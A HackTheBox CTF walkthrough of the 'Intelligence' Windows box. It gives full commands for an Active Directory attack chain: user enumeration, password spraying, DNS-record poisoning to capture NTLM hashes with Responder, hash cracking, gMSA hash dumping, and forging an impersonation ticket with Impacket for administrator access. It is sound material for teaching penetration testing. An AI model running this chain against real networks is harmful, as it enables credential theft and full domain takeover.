@@ -1,0 +1,151 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Intelligence HacktheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/intelligence-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-01-23T12:12:38+00:00">January 23, 2022</time><time class="updated" datetime="2025-06-19T14:11:56+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">HackTheBox rates Intelligence as a CTF Windows box with a difficulty of “medium”. The machine covers OSINT, AD attacks, and silver ticket for privilege escalation.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Directory enumeration to find PDFs</span></li>
+<li><span style="color: #000000;">Extracting usernames from PDF’s exif</span></li>
+<li><span style="color: #000000;">Hunting password in PDF and SMB login to extract info on a 5 min recurring powershell script</span></li>
+<li><span style="color: #000000;">Adding DNS record to catch NTLM hash</span></li>
+<li><span style="color: #000000;">NTHASH of the GMSA svc_int$</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Obtaining TGT</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Performing silver ticket attack</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s deep dive into this.</span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">The dedicated IP address of the machine is <strong>10.129.163.131. </strong>We’ll run a nmap scan on this machine’s IP.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -p- 10.129.163.131</pre>
+<p><span style="color: #000000;">We found many ports open; 53 – DNS, 80 – HTTP and 445- SMB caught our eye.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgpjXmGQYtUk8Kfq63dNwzi4ziDf0U26ybqpXj-aJCncP7w7oItnkNuwt3b4W7UWEGRmeOHjEN-s88ZD3AkGg2DCNY1EL1286jsCOwq4e-Ymj_tUhzUiSXrBS0Rit_MoLlLxqj8gvtHEI6KMT6CRgRqere5CtBwVJeIISVmwsfItg92AkxK_HSpgtKGHw=s16000"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Immediately headed over to SMB and tried listing shares without password but it was not fruitful.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEitekGdMuvxki4z22ff02j3fH66N12v4tNqO5GrSsgamrlEHMrxZHOq4PBdi1IPX-hdQgBAZk14ZQyOaAQQEo0ntd_XGNcvNeJJPlXcyHOl7flbA8KMbu_rdhbpVczD7Y2lttkwou4DO3ZXasA9mXE70rJSWOtP6uHXEKHuKIYZBENwZl-Dq4pqQebB6Q=s16000"/></span></p>
+<p><span style="color: #000000;">We then immediately headed over to the website and saw various PDFs available to download.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg44dLrUisEOrC98nwQRUHYJtgrEc6SpPlxcDsTy84oXO5-QwpmVrx7XILM834RiSWnZrO1JRRqPe-IUad9k4Yv8gC4tt2DO6f5iuJQ9woPTN4Yn6QDflL-DWRwYCW0wViR-opm6uaVbSO5_UR8OLjPasiq8Ag1Kiw8CMYMPgBzReof2GGVz89o-r5qIQ=s16000"/></span></p>
+<p><span style="color: #000000;">We then downloaded these PDFs which had some written material. Upon checking their exif we saw the author’s names that could be actual users on the Active Directory on the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh1WI1b2dRk1C6S6RPEwwN4XVOQZMFhr3r4LDm68WA6FLxjrDpIvap0d9dXtQRPK-w6d9-f7BWNVEk0GFLuHSjkRTzQXgZVjYcHnstluDQKL-MwJ6-WEsF63JWkQ_E1unkKhTKOynK3UsFoN2YvqzUQMGoBR0viZiM_8wYzNoEbPwp5uCVLcxdcad6k8Q=s16000"/></span></p>
+<p><span style="color: #000000;">To verify the existence of these users we copy them into a file and use kerberute’s userenum function</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "Jose.Williams" &gt; usernames
+echo "William.Lee" &gt;&gt; usernames
+kerberute userenum -d intelligence.htb --dc 10.129.163.131 usernames</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiW3-vTUXNT7QxIt0ldDUCA8sf3A1Q9odxDNR8uqOismwFJ-0Q4fYD2IPGE3imiSeHpIoo060qlcMSniVh3ZgiczAcNQK-u6xqDVhEfuISF63a-QkNlDr43988yPS1Jh9sRPvxpv6I12RtxlhVVxzqVicyLU5BTkm5v82duwDhpVucgBsqTj9W9xlhDSw=s16000"/></span></p>
+<p><span style="color: #000000;">Now that the validity of these users has been confirmed, lets look if there are any more PDFs on the /documents directory on the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjVzRkL9Zdlb9jAoCUch8LVImhHFcngpzG3BJZu4VoipXIjTMsIDSoRLprv8-aJn_2dvALatw1D7OFDlri7_AqRls9PQyWf19v0b4H5ZMwgBPJdBT9-x3fprcvHXMf6KCGtY3kKRdzf3NamaIIT5WjEhUL5DZt4u77BUbgzyrda1WVAsYAC0O2EQ1rK-Q=s16000"/></span></p>
+<p><span style="color: #000000;">Since we don’t have access to view the directory, we can fuzz the file names of the PDFs and try to check their existence. See the PDF downloaded above, they are in the format YYYY-MM-DD, so I designed a script to generate these dates and then append “-upload.pdf” at the end of it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">#!/bin/bash
+
+start=2020-01-01
+end=2022-01-01
+while ! [[ $start &gt; $end ]]; do
+    echo $start
+    start=$(date -d "$start + 1 day" +%F)
+done
+
+./fuzz_date.sh &gt; datelist.txt
+cat datelist.txt | head -n 3
+sed -i s/$/-upload.pdf/ datelist.txt
+cat datelist.txt | head -n 3</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj8olU21VloAYHYWWKhilaEO66jofrIKJClp-cycChTevCzjnNnZEFcs4DXxsbYkWRlMe5ekk5nVxHIFH7iACtlJ4aj3KnmbV8BH7vbOzk2Tdu6YPkBqAphHTW4pNGjV6gDWStx48DqJziQKP_SseZ07r9Q35qx0OT1mQ278P-uAcUCtrtbqgOzAu_eqw=s16000"/></span></p>
+<p><span style="color: #000000;">Now that we have a text file ready, we need to fuzz it using DIRB and save the existing PDFs in a file called existing.txt</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.129.163.131/documents/ datelist.txt -o existing.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg_C73dHZN_mPZEBfyZUAFECXcFQDfE3PEfGybuXjylvN-Lahc0NYfZAEfVP8rb9yYVLsi_tHrlIJk6QcCM9yUQsq7l_Xu5f9sSNyvXnoVYw7xC51h9o9BSzQylrZ2yNiUrLPYOm1DVswWWWKT6RZFiM6qgzt4vY6ZX7RsmKlAveaHk67fXMOywRuZDHA=s16000"/></span></p>
+<p><span style="color: #000000;">Now that we have found that many other PDFs exist on the server, and copied their absolute paths into a text file, we need to edit this file quickly so that one URL comes in one line. This will be used later.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sed 's/[^ ]* //' existing.txt &gt; 2.txt
+sed 's/\s.*$//' 2.txt &gt; 3.txt
+cat 3.txt | head -n 4
+rm existing.txt 2.txt &amp;&amp; mv 3.txt existing.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhGuC-Zv3lkwV0lnrdpdZlYeiu3sNVAMM0sKG81sZujXejJwf2I3jrmaFf8dKZ9mlQRcXObjBcysEV5t9fwAtwNNYwMYjocP2wFyXjwG54T0tStxSj-mwk762-dCwwE1Hv-kfLAP-qfDhUMtVLN9RL35_wNaKo5y0LEHVyMNLHdHBlqcl38-1wPWY7eKw=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we can download all the PDFs at once (mass download) using wget like</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget -i /home/kali/hackthebox/intelligence/existing.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi5idukVC7mDgv7lSvPpCZp16ANekoygfOlWOShkSt5X8hXOGxZBQj55NoLLj_6uzzwREXHVGWvX4Eo94SmpbCfckB8_AWZscLzkxCRQ9gXuLeFPbR_NAbsjMZJqVr0ailzLwwq_0_-ptSqpMwGDUxQmBpVt3Tetk4ccc7QE6EoxEbiuKQJl7k9imLT5Q=s16000"/></span></p>
+<p><span style="color: #000000;">Now, I went through the files one by one and found a password in one of the PDFs</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhRAAZSWVkkI_5vKfYlw0WCyAvS9MqZ8NGlcXsfpGdM2K-j7BvfaDAdIrER8tcjbLUA9btrQYm-n6bI7Z8Jg6_ynnddNbsWuoAa9996TsOW45B8MErQ4CRdxDPhCj7YPJnxHbYr3zAeZMSfMkqazm5L5CH6dtaAtIZR08phLK9wbsriE3mJkVxN2fn98Q=s16000"/></span></p>
+<p><span style="color: #000000;">But this password did not belong to the two users we had found earlier. So, we looked around and found many other users are being revealed through exif. Hence, we looked at all of the PDF’s exif, saved the username in a file so that each user is in a separate line.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "NewIntelligenceCorpUser9876" &gt; password.txt
+exiftool *.pdf | grep Creator &gt; u1.txt
+sed 's/.*://' u1.txt &gt; u2.txt
+sed 's/[^ ]* //' u2.txt &gt; u3.txt
+rm u1.txt u2.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEifayfxDH_uSk7M7XfrA0iFN9ilQZztYCg_3GND9n-zk16JnXZz8rwOUl-RBli3tWF_n-Y6W2C0KA9Z3AvDRGGT288hjbgvGTDSnXLel30mxkPrv4piMioEAE3ibdC0ChDnrB1xDXYaHvc6ZJMIry91kyKjLvSRxVqzEE24Q_3YbY4geKeIRPiHSdb52A=s16000"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Now, we can use crackmapexec to bruteforce usernames against the found password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 10.129.163.131 -u u3.txt -p NewIntelligenceCorpUser9876</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi2K5NusZismCMGjuYgosMLDBQI24mWowopQNx_Cw06CylCLdqVyypXmVoaJMyuZKNiEbv5ClgR9a7EQUNRMc_9tSlkRjdvbnrrqu8pHrNOqh7GsKCC89eCBMV4JC1b_h5Lby3TuCmUcA98b7EtJh8UMW4x78qAqymMOqP3pIDsD4BNrMcF30BQOfCcDQ=s16000"/></span></p>
+<p><span style="color: #000000;">We did find one valid entry!</span></p>
+<p><span style="color: #000000;">User: <strong>Tiffany.Molina</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgcxbtlS8xa2irDQ_5u5tqEqXgvFdKpXY8eqSl2775ak9QjzCesjtYpRiQuCWr2rl6h5a2TTxpVFmuIkBF34boiIIfM2crYmK_AFVXdraf3ikHEUegm2HvG5nnU5iCXoUz5-KwOIzBpWw2ShBl8Ap_DvEB7OWgM-macL9KbtxFy5HaNKDn3Jlj9jG44zQ=s16000"/></span></p>
+<p><span style="color: #000000;">Now we tried to list the SMB shares using the obtained credentials.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient -L 10.129.163.131 -U Tiffany.Molina%NewIntelligenceCorpUser9876</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgQe1lCI3wGp4xddALGXfCzzrxqd1nS7PsxD6v0t1alE9wNHoyzS0mcjyZcGmUxjQ9ylzbbpy1Ey2UxIHOaAcSboYMm8V8dGMJkDfo9AfDZf_C7puCjf9Vt2LQVuYohzgmyALCfOlALDYECWlNpTNUNkEWKOt2l0SfHXn8S-Qxv19H8Bu6myUqNBHfFHw=s16000"/></span></p>
+<p><span style="color: #000000;">The share called “IT” had an interesting powershell script called downdetector.ps1. This script was, at 5 minutely intervals, firing out web requests to see if it got an HTTP status 200. It was looking at AD entries where the object name started with ‘web’ and finally sending out a WebRequest.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgiyhPKgMdVZmsfYrH4ZsTJ3I6ds0uKyy51J_Yy7o66mrafJZQpGAXOaWF6hI4VfpK5hfARqz1gH3dgUBLhyaP5IQswFGRo_qJ1bH-QakoUz2GVXwPK0pHPfK8GbYtQXorwcm_LmhvX--5YjPuKeeTRDXd78Nq9BYk00oF5URmO6r9mCBltGxCmA6jd2w=s16000"/></span></p>
+<p><span style="color: #000000;">We need this WebRequest to reach our machine instead and for that we need to add a DNS record that points to us, so that we can capture auth request. For this, we’ll be using DNSUpdate script that can be found <a style="color: #000000;" href="https://raw.githubusercontent.com/Sagar-Jangam/DNSUpdate/master/DNSUpdate.py">here</a>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/Sagar-Jangam/DNSUpdate.git
+pip3 install -r requirements.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhht91lVo-24kCx1mnzf7y1HFoXOEoT5m7jxcy3egDH6l1C16yBHRi2cWqshVRDXmvlzgNwRvvqQ6uhu5tOgG9XXyGn5Shc6XwpdGHvrIPG-8tX_Y_FQ6NKV_vvGem_PIRN4j_RZxztZIR5ngjTVHdyA4dmTmSnbSdHu80ZE48G2sjr33mdmXoV2e3Cdg=s16000"/></span></p>
+<p><span style="color: #000000;">Let us first set up a responder on our local system (HTB tunnel)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhdQ8NciGvzq-jxsNoZvzaZWaupc_quYGaTv8J25FD2vadp_2ifK094IB61a8V5a50pBSz8yb-OoeT3VY9o-yMmyPJc_vNyKvC8hTU9E1MsRJgaxzKOaz7I1b_5OdfEzig5KVDeuJZXiaCpg7wG7ohTShHqzRn89zJsuKwZGhcD9YubLUi2UqKkljDzqw=s16000"/></span></p>
+<p><span style="color: #000000;">We can add the DNS record using the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3.10 DNSUpdate.py -DNS 10.129.163.131 -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a ad -r webharsh -d 10.10.16.10</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh45CveKEKuQjklsdG-IJknfmmEjH_wzIbUwYk4ko2qi9ga7FrLcPx6wfUZmoLxkPBM2fgSBWD1Yjuk-toXovt3NLit-SHglSiRgX63cCreYh5mQfm3M0ZAxILzXyPaO2ca1ojA7PvfcB0dsTgCrEJokLuFbjYkiOZK5FpKPXjqnPcB2wUXZX2fqbX-zg=s16000"/></span></p>
+<p><span style="color: #000000;">It got added! Now we waited for 5 minutes and got juicy hash of a user Ted Graves</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhO8v6bnxgxKkmui3aaoQu_-fP_ylwUCPF7I-UVt950eRNE_kjAKmfBy7GmLVtNnpnCkLIDX5yMzvpGlJpDfnjOO6iJE-69Z3iqgrijhPz2qzwnCfOgsetMJttNbC6AxvHUn9eXpvA9f4gW4uOSdxNLiWE6ayQHwZr9fOMRYCKA7nx4mzo3zSFxSoYcQA=s16000"/></span></p>
+<p><span style="color: #000000;">Now we copy this hash into a file called “hash” and run hashcat on it. 5600 is the code for netntlmv2 type hash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt</pre>
+<p><span style="color: #000000;">As you can see, we have received a password!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjsLHmVOff6J0ae9ilUu9wiW08vAi-QwLX9ZLpaE13X1FRwoe2nFXsgimCSJfGf5T91EFrmCF-C3KmKTK7cAjTfd0GaRwKg4Pbkw4ytwzHuXCq-VlYHioLSJvy5A6iV__nyY-8WqFYbF-P3RZFMf0kD7pVyU7Ls6kCyB_bAtxfT8mIC6CroJEWtuqadSg=s16000"/></span></p>
+<p><span style="color: #000000;">Now that I had the credential for Ted, I instantly used ldapsearch to dump information about the directory on the server</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldapsearch -H ldap://10.129.163.131 -x -W -D "Ted.Graves@intelligence.htb" -b "dc=intelligence,dc=htb"</pre>
+<p><span style="color: #000000;">This gave me an interesting insight. A group managed service account was running on the domain.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgD3BoWjfScMz549KlWC9xcQrp0XOTt7UMAdEeKfTwjDFNRE2yABXIgpvszRD1gSof44Eg30p09S21l5pid103IUTJW_nc1W2XVQ9jPXhT_TNfXVWprMo4O0pD3uU4R0Y5HDAxE8whCc2lkVmyR0DdwBzB-3DzCqz-93wdVE16eASMAuGq3ZQabmEnnMw=s16000"/></span></p>
+<p><span style="color: #000000;">This MSA was trusted for delegation to WWW. So, this MSA’s password can be dumped now that we have ted’s credential. (check the article <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://adsecurity.org/?p=4367">here</a></strong></span>) So, we will use gMSA dumper tool to do this. You can download this <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/micahvandeusen/gMSADumper">here</a></strong></span></span></p>
+<p><span style="color: #000000;">We can dump the account’s hash using the command (add intelligence.htb in /etc/hosts first)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "10.129.163.131  intelligence.htb" &gt;&gt; /etc/hosts
+git clone https://github.com/micahvandeusen/gMSADumper.git
+python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb</pre>
+<p><span style="color: #000000;">Voila! We received a hash of the service account.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh_WYhaVQVeW2mgPNaUuJYZxEhA3DjjxG1-2m7Qz79Yzqt12MvTfJ6oqPtYRZRR_8ZbAuccopyt4bdVCKgL3hQvGOwme0dTdfRuaJoBRjcHM-50CAelTrHKddO8PnPcAfGgFetApdcMosaFGiRu8eg_ODcrNp_lZxN7NpLXlfPotedKkbB6J7k28Nd-Tw=s16000"/></span></p>
+<p><span style="color: #000000;">With this service account’s hash, we can use Impacket toolkit’s script <strong>getST.py</strong> to create a silver ticket. But we encountered a problem with this. After some googling, it turns out that we need to sync our time clock with the server’s time in order for silver ticket to work. We do this like following:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install ntpdate
+sudo ntpdate 10.129.163.131</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhFwbBGZpQwLXIukhKepAItLsNwKqnaQazN3BAJlonVuXO6cTdB7vVMyUonGdvY-PbRk2xUQ-xoNiK4z9_AADzlR--nTzL6dzY28BwJaUGXHW8PQxqTTEcfM4cIgJl1g5IPcf9H1xsbR3046P1JAcyGLDJr0PCpMtCLQY2X46VPeA8AkHrjPuMGZPlwIA=s16000"/></span></p>
+<h3><span style="color: #800000;">Post Exploitation</span></h3>
+<p><span style="color: #000000;">Ensure that you install and upgrade impacket.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip3 install impacket --upgrade</pre>
+<p><span style="color: #000000;">Then, we will use <strong>getST.py</strong> to generate ourselves a silver ticket using the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :6e03616eef48ba6a15be62280aefcdb2 -impersonate administrator</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgB_Fqrbh63MNeZfpO5INCCdVjAVJOijKC8iKQnGt-ylfeV0wjWhrZR5Y6deThPUoSje-tJZZ8zXjNVyafX5m7jwn19375Zq09VWR3K7tFdbV4RNVlzTHG55lJX0yydzEHrwgCg4L71PdLT_yRTdlGezlKQjoeK0A7ujUTLAzrQkDobF1DKN5u25u0L6Q=s16000"/></span></p>
+<p><span style="color: #000000;">We need to export administrator.ccache first and then we need to add dc.intelligence.htb in our hosts file. Load the ccache ticket by setting the <strong>KRB5CCNAME</strong> environment variable to the ticket path. This environment variable automatically picks up the kirby ticket (stored in administrator.ccache) and uses in attacks against domain.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=administrator.ccache
+echo "10.129.163.131 dc.intelligence.htb" &gt;&gt; /etc/hosts
+klist</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgBK43b6HsiVHsEHHfbE-jfg-YVMr9dmj8fWWzRXCp0foqcbKAdrVJ1zmU5fiYHp9UH5Uzmy9ukKyyigc0t2B8oTKRQrsbg83CjzNeXusSDOpBJTEtLOgEF86PhEvpJK-WSxvxsQ850usqdP9t8Xp6SI256bPCUoK33Zc3um3MJBb4tHwccv3OLl1yJSA=s16000"/></span></p>
+<p><span style="color: #000000;">Finally, we can use Impacket’s psexec to connect as an administrator and snag our root flag!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass dc.intelligence.htb
+cd ../../Users/Administrator
+type root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjXkmd4KS6O65OPnCk2xQZg758U3a_CtE6PEBOoAv92aE6hss18FA3QD26wBNVbaGFh-S6bb_Z22G1BgeRDoYG9ISIFoUNsStjCcIopD87QnJuARCIslipvoGIYV3sxeXk2bCnzmDJchPjReDlufgNcpTjeH33HwPVhfWTdz1wgBPSqlHGNCn9jeyp9AA=s16000"/></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">The lab does not carry any traditional CTF like qualities but resembles highly to what one can see in real life. From extracting information from PDFs to validating existence of a user to compromising the Admin account by exploiting misconfiguration, the lab gives a lot to think about the actual existing security posture on Active Directories. No one exploited CVEs in the lab, and yet people commonly engage in this type of exploitation. Hope you liked the article. Thanks for reading.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact<strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
